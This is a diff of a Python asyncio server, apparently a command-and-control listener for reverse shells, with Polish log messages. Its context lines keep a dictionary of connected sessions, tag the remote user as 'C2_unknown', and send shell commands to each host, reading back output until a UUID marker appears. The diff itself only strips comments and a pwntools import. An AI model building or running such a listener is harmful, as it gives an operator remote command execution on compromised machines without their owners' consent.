@@ -1,4 +1,3 @@
-#from pwn import *
 from threading import *
 from time import *
 from asyncio import *
@@ -9,21 +8,18 @@ sesje = {}
 
 async def run_cmd(reader, writer, command, host, user):
     granica = str(uuid4())
-
-    #full_cmd = command.encode()+b'; echo -n '+ granica + b'\n'
     while not reader.at_eof():
         if reader._buffer:
          reader._buffer.clear()
         else:
             break
-    #command = command.encode('utf-8')
+
     command = "( "+ command
     command2 = f"&& echo -n {granica})\n"
     writer.write((command+command2).encode())
     await writer.drain()
     await sleep(0.1)
-    #writer.write((f"echo -n {granica}").encode("utf-8"))
-  #  await writer.drain()
+
     odp = b""
     while granica.encode() not in odp:
         try:
@@ -40,16 +36,12 @@ async def run_cmd(reader, writer, command, host, user):
 
 
 
-
 async def handler(reader,writer):
     addr = writer.get_extra_info('peername')
     print(f"[N] znaleziono połączenie z {addr}")
     sesje[addr] = writer
     try:    
         username = "{C2_unknown}"
-        #writer.write(b"stty -echo;")
-        #await writer.drain()
-        #await run_cmd(reader,writer,"stty -echo",addr,username)
         try:
             await wait_for(reader.read(4096), timeout=0.3)
         except TimeoutError:
@@ -75,7 +67,6 @@ async def handler(reader,writer):
         print(f"[{addr}] Otrzymano: {data_.decode().strip()}")
 
     except Exception as e:
-        #print(f"exception: {e}")
         raise(e)
     finally:
         print(f"[-] zamykanie {addr}")
